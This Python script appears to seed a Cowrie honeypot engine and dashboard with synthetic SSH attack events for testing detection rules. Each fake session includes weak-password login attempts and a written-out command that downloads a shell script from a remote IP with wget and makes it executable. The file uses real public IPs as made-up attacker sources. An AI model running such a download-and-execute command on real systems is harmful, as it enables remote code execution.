"""Writes synthetic Cowrie-style JSONL events to COWRIE_LOG_PATH so the
already-running engine (and dashboard behind it) has real, geolocatable
traffic to ingest, without needing an actual attacker.

Uses real public IPs (verified against this repo's own GeoLite2-City.mmdb
at the time this was written) rather than private/RFC1168 addresses -
GeoLite2 never resolves a location for private ranges, so an attacker
container on the docker-compose network can never produce a map dot no
matter what IP it's given.

Run this while `python -m engine.main` (or the docker-compose `engine`
service) and the dashboard are already running - the listener picks the
new lines up on its next poll.

Usage:
    python scripts/seed_sample_traffic.py
    python scripts/seed_sample_traffic.py --log-path /tmp/cowrie.json
"""

from __future__ import annotations

import argparse
import json
import os
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

# (country, city, src_ip) - country/city are just human-readable labels here;
# GeoLite2 does the actual resolution when the engine enriches src_ip.
LOCATIONS = [
	("United States", None, "8.8.8.8"),
	("South Korea", "Seoul", "210.220.163.82"),
	("Australia", "Melbourne", "203.2.218.1"),
	("Malaysia", "Cyberjaya", "1.32.0.1"),
	("Russia", None, "77.88.8.8"),
	("South Africa", None, "196.216.2.1"),
	("Algeria", "Algiers", "105.235.128.1"),
	("Brazil", "Sao Paulo", "200.160.2.3"),
	("Argentina", None, "190.2.1.1"),
	("Mexico", "Mexico City", "132.248.53.68"),
	("Japan", "Tokyo", "203.104.153.1"),
	("Germany", None, "194.25.2.129"),
	("India", "Mumbai", "202.54.1.1"),
	("Canada", "Toronto", "142.150.190.39"),
	("Egypt", None, "163.121.1.1"),
	("United Kingdom", "London", "212.58.244.20"),
	("Kenya", "Nairobi", "196.201.214.1"),
	("China", "Shanghai", "202.96.209.5"),
	("France", None, "212.27.48.10"),
	("New Zealand", "Auckland", "202.27.184.3"),
	("Nigeria", "Lagos", "196.46.221.1"),
	("Chile", None, "200.9.100.1"),
	("Sweden", "Stockholm", "192.36.125.2"),
	("Indonesia", "Jakarta", "202.152.0.1"),
	("Turkey", None, "193.140.1.1"),
]

BAD_PASSWORDS = ["123456", "password", "admin", "letmein", "qwerty"]
SUSPICIOUS_COMMAND = "wget http://185.220.101.5/x.sh -O /tmp/x.sh; chmod +x /tmp/x.sh"
SUSPICIOUS_DOWNLOAD = {
	"url": "http://185.220.101.5/x.sh",
	"filename": "x.sh",
	"file_path": "/tmp/x.sh",
	"sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
}


def _timestamp(offset_seconds: float) -> str:
	moment = datetime.now(timezone.utc) - timedelta(seconds=offset_seconds)
	return moment.strftime("%Y-%m-%dT%H:%M:%S.%fZ")


def _events_for(src_ip: str, start_offset: float) -> list[dict]:
	session_id = uuid.uuid4().hex[:12]
	offset = start_offset
	events: list[dict] = []

	def emit(eventid: str, **fields) -> None:
		nonlocal offset
		events.append(
			{"eventid": eventid, "timestamp": _timestamp(offset), "src_ip": src_ip, "session": session_id, **fields}
		)
		offset -= 3  # each following event a little more recent than the last

	# Triggers Bad Credentials (per attempt) and Brute Force Attack (5th failure).
	emit("cowrie.session.connect", src_port=44012, dst_port=2222, protocol="ssh")
	for password in BAD_PASSWORDS:
		emit("cowrie.login.failed", username="root", password=password)
	emit("cowrie.login.success", username="root", password="toor")  # "root" alone still trips Bad Credentials
	emit("cowrie.command.input", input=SUSPICIOUS_COMMAND)  # Suspicious Command
	emit("cowrie.session.file_download", **SUSPICIOUS_DOWNLOAD)  # Suspicious Download

	return events


def build_lines() -> list[str]:
	lines: list[str] = []
	offset = 0.0
	for _country, _city, src_ip in LOCATIONS:
		for event in _events_for(src_ip, offset):
			lines.append(json.dumps(event))
		offset += 120  # stagger locations a couple of minutes apart
	return lines


def main() -> None:
	parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
	parser.add_argument(
		"--log-path",
		default=os.getenv("COWRIE_LOG_PATH", "/var/log/cowrie/cowrie.json"),
		help="Must match the running engine's COWRIE_LOG_PATH (default: %(default)s)",
	)
	args = parser.parse_args()

	log_path = Path(args.log_path)
	log_path.parent.mkdir(parents=True, exist_ok=True)

	lines = build_lines()
	with log_path.open("a", encoding="utf-8") as f:
		for line in lines:
			f.write(line + "\n")

	print(f"Wrote {len(lines)} events across {len(LOCATIONS)} locations to {log_path}")
	print("The running engine will pick these up on its next poll.")


if __name__ == "__main__":
	main()
